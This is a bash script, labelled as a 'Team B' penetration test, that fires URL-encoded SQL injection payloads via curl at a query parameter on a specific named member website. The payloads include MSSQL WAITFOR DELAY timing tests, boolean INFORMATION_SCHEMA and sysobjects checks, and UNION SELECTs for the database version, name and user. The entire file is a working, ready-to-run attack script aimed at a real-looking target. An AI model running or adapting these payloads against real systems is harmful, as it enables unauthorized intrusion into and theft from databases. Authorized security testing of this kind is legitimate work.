#!/bin/bash

# Simple SQL Injection Verification Script
# Team B - Panama8888b Penetration Test

BASE_URL="https://member.panama8888b.com/public/js/v2/app.js"

echo "[+] Simple SQL Injection Verification Tool"
echo "[+] Target: $BASE_URL"
echo "=================================================="

# Function to test SQL injection payload
test_payload() {
    local payload="$1"
    local description="$2"
    
    echo ""
    echo "[*] Testing: $description"
    echo "[*] Payload: $payload"
    
    # Test multiple times
    echo "[*] Running 3 tests:"
    for i in {1..3}; do
        echo -n "  Test $i: "
        time_result=$(curl -s "$BASE_URL?v=$payload" -w "%{time_total}s" -o /dev/null)
        echo "$time_result"
        sleep 1
    done
}

# Test baseline
echo ""
echo "[*] Testing Baseline Performance"
test_payload "25.1" "Normal Request"

# Test time-based SQL injection payloads
echo ""
echo "[*] Testing Time-Based SQL Injection"

# URL encoded payloads
test_payload "25.1%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20--" "WAITFOR DELAY 5 seconds"
test_payload "25.1%29%29%20WAITFOR%20DELAY%20%270%3A0%3A3%27%20--" "WAITFOR DELAY 3 seconds"
test_payload "25.1%29%29%20WAITFOR%20DELAY%20%270%3A0%3A1%27%20--" "WAITFOR DELAY 1 second"

# Test boolean-based SQL injection
echo ""
echo "[*] Testing Boolean-Based SQL Injection"
test_payload "25.1%29%29%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.TABLES%29%3E0%20--" "INFORMATION_SCHEMA check"
test_payload "25.1%29%29%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20sysobjects%20WHERE%20xtype%3D%27U%27%29%3E0%20--" "sysobjects check"
test_payload "25.1%29%29%20AND%201%3D1%20--" "True condition (1=1)"
test_payload "25.1%29%29%20AND%201%3D2%20--" "False condition (1=2)"

# Test UNION-based SQL injection
echo ""
echo "[*] Testing UNION-Based SQL Injection"
test_payload "25.1%29%29%20UNION%20SELECT%20%40%40version%20--" "UNION SELECT @@version"
test_payload "25.1%29%29%20UNION%20SELECT%20DB_NAME%28%29%20--" "UNION SELECT DB_NAME()"
test_payload "25.1%29%29%20UNION%20SELECT%20USER_NAME%28%29%20--" "UNION SELECT USER_NAME()"

echo ""
echo "[+] SQL Injection Verification Complete"
echo "[*] Look for response times significantly longer than baseline (~1.2s)"
echo "[*] Time-based payloads should show delays of 1-5 seconds if vulnerable"
echo "[*] Boolean payloads may show different response times for true/false conditions"